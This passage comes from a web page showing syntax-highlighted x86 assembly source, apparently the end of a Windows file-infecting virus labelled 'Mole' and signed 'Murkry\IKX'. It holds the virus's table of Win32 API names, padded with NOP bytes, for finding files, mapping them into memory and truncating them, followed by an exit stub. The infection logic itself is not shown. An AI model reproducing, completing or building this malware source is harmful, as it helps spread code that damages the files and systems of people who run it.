        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;19</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;14</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;12</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;15</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;14</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;16</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
               
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;13</span><span class="sc0">
        </span><span class="sc1">;db      6 dup(90h)      </span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Murkry\IKX'</span><span class="sc0">

</span><span class="sc1">;=========================================================================</span><span class="sc0">

</span><span class="sc5">fini</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">;this simply terminates the program</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">Mole</span><span class="sc0">



</span></div></body>
</html>
